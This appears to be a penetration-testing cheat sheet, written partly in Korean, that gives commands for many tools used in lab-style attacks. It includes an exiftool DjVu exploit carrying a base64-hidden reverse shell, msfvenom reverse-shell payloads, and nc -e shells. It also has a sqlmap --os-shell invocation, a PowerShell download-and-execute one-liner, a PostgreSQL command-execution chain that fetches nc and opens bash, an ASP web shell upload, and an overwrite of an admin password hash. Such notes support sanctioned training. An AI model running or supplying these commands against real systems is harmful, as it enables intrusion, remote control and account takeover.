# Squid Proxy
```bash
python3 spose.py --proxy http://10.10.11.131:3128 --target 10.10.11.131
```
- https://github.com/aancw/spose
---
# Windows Download Command
```powershell
certutil -urlcache -f -split <target>

Invoke-WebRequest <target> -OutFile <Path>
```

---
# exiftool

```bash
exiftool -a -u brochure.pdf
```

- `exiftool` : 이미지/문서/영상 파일의 메타데이터를 조회·수정하는 도구  
- `-a` (*allow duplicates*) : 중복 키가 있어도 모두 표시  
- `-u` (*unknown*) : 표준에 없는(알 수 없는) 태그까지 표시  
- `brochure.pdf` : 대상 파일

## exiftool code execution
```bash
payload : (metadata "\c${system('echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMzguNi80NDQ0IDA+JjEK | base64 -d | bash')};")
bzz payload payload.bzz
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
file exploit.djvu
```
---

# GCC
```bash
# 교차 컴파일
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```
```bash
# 공유 라이브러리 만들기
gcc -shared -fPIC ex.c -o ex.so
```

---
# curl
```bash
curl -L http://192.168.132.65

curl -X POST -d 'data=data' <address>
```

- `-L` : redirection

---
# wget
```bash
wget http://ip/test.txt -O /tmp/test.txt
```

- `-O` : 데이터 저장(대문자)
- 혹여나 작동을 안할시 `http://`를 제외해볼것.

---
# find
```bash
find . -name '*config*' 2>/dev/null
```
---

# sqlite3
```bash
sqlite3 {dbname}
.tables
.headers on   # 컬럼 이름 출력
.mode column  # 표 형식으로 출력
select * from user;
.quit
```
---
# msfvenom
```bash
msfvenom -p windows/shell/reverse_tcp -f python
# 바이트 타입을 명시하기 위해서 b가 붙여서 나옴.

msfvenom -p windows/shell/reverse_tcp -f c
# 바이트 타입 명시 필요 없어서 b가 안붙여서 나옴.

msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=kali LPORT=6379
```
# nc
```powershell
# windows
nc <ip> <port> -e cmd.exe
```
```bash
# linux
nc <ip> <port> -e /bin/sh
```

---
# sqlmap
```bash
sqlmap -u "http://192.168.211.52:3305/zm/index.php" \
       --data="view=request&request=log&task=query&limit=100&minTime=1466674406.084434" \
       -p limit -batch --level=5 --risk=3 --os-shell
```
 `-u "http://192.168.211.52:3305/zm/index.php"`
- 대상 URL을 지정합니다.  
- 여기서는 공격 대상 웹 애플리케이션의 엔드포인트 `/zm/index.php`입니다.

 `--data="..."`
- `POST` 방식으로 보낼 데이터(Body 내용)를 지정합니다.  
- 여기서는 `view`, `request`, `task`, `limit`, `minTime` 파라미터가 포함되어 있습니다.

 `-p limit`
- 공격할 대상 파라미터를 지정합니다.  
- 여기서는 `limit` 파라미터가 SQL Injection 취약점이 있을 것으로 판단되어 지정했습니다.

 `-batch`
- 모든 질문에 자동으로 기본값(yes/no)을 선택하여 **비대화식(자동화)**으로 실행합니다.  
- 사용자 입력 없이 빠르게 공격 시도할 수 있습니다.

 `--level=5`
- 탐지 강도를 설정합니다. (기본값 1, 최대 5)  
- 값이 클수록 더 많은 테스트 페이로드를 사용합니다.  
- 단, 요청 횟수가 많아져 시간이 오래 걸릴 수 있습니다.

 `--risk=3`
- 공격 시도의 **위험도 수준**을 설정합니다. (기본값 1, 최대 3)  
- 값이 높을수록 DB에 부담을 주거나 서비스에 영향을 줄 수 있는 페이로드까지 시도합니다.

 `--os-shell`
- SQL Injection을 통해 DB 서버에 접근한 뒤, **운영체제(OS) 명령어 쉘**을 실행하려는 옵션입니다.  
- DB 계정 권한이 충분하다면 `whoami`, `ls`, `id` 같은 명령을 실행할 수 있습니다.  
- 권한이 제한적일 경우 실패할 수 있습니다.
---
# mysql
```bash
mysql -hlocalhost -uadmin -padmin --skip-ssl
```
```mysql
SHOW GRANTS FOR CURRENT_USER();
```
- 현재 접속한 계정의 권한 확인
```mysql
update planning_user set password ='df5b909019c9b1659e86e0d6bf8da81d6fa3499e' where user_id='ADM';
```
- 문자는 ''로 감싸줘야 인식.
- 감싸지 않으면 컬럼명으로 인식한다.
---
# powershell
```powershell
IEX(New-Object Net.WebClient).DownloadString("http://ip/file")
```
---
# SNMP(Simple Network Management Protocol)
- 네트워크 장비(라우터, 스위치, 서버, 프린터 등)를 관리 및 모니터링하기 위한 표준 프로토콜
```bash
snmp-check <ip>
```
---
# IMAP3
```bash
telnet <ip> 143

a LOGIN <id> <password>

a LIST "" *

a SELECT INBOX

a SEARCH ALL

a fetch <NUMBER> body[header]

a fetch <NUMBER> body[text]

a LOGOUT
```
---
# cadaver(IIS server /webdav exploit)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.6.2 LPORT=4444 -f asp > shell.asp

cadavar <ip>

put shell.asp
```
---
# PostgreSQL RCE
```bash
psql -h $IP -p 5437 -U postgres  

postgres=# \c postgres;
postgres=# DROP TABLE IF EXISTS cmd_exec;
postgres=# CREATE TABLE cmd_exec(cmd_output text);
postgres=# COPY cmd_exec FROM PROGRAM 'wget http://Kali IP/nc';
postgres=# DELETE FROM cmd_exec;
postgres=# COPY cmd_exec FROM PROGRAM 'nc -n <kali IP> 5437 -e /usr/bin/bash';
```
---
# cewl(Custom Word List generator)
```bash
cewl -d 5 -m 3 http://postfish.off/team.html -w /home/kali/Desktop/cewl.txt
```
---
# SMTP User Enum
```bash
perl smtp-user-enum.pl -M VRFY -U /home/kali/Desktop/known-users -t 192.168.211.137
```
---
# swaks(send mail tool)
```bash
swaks --server smtp.example.com \
      --from me@example.com \
      --to you@example.com \
      --auth LOGIN --auth-user me@example.com --auth-password "비밀번호" \
      --attach @test.txt
```
---
# VNC(Virtual Network Computing)
- 네트워크를 통해*다른 컴퓨터 화면을 공유하고 원격 제어할 수 있는 기술  
```bash
vncviewer 192.168.0.10:1
```
---
# scp
```bash
scp -O -i id_rsa authorized_keys max@$IP:/home/max/.ssh/authorized_keys
```
- `-O` 최신 scp에서는 SFTP프로토콜을 사용하는데 예전의 SCP프로토콜을 사용하도록 설정
---
# FreeBSD 
```bash
./ident-user-enum.pl 10.0.0.1 21 80 113 443
export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```
---
# gzip unzip
```bash
gzip -d <file>
```
---
# tar
```bash
tar -cf target.tar foo bar
tar -xf target.tar
```
---
# ldd
```bash
ldd /usr/bin/log-sweeper
```
- 실행 파일이 사용하는 공유 라이브러리(동적 라이브러리, .so 파일)를 보여주는 명령어
---
# ssh
```bash
ssh -i root -o IdentitiesOnly=true root@localhost
```
`-o IdentitiesOnly=true`
- 저장되어 있는 다른 키들을 같이 전송하기 때문에 해당하는 키만으로 인증하는 방법
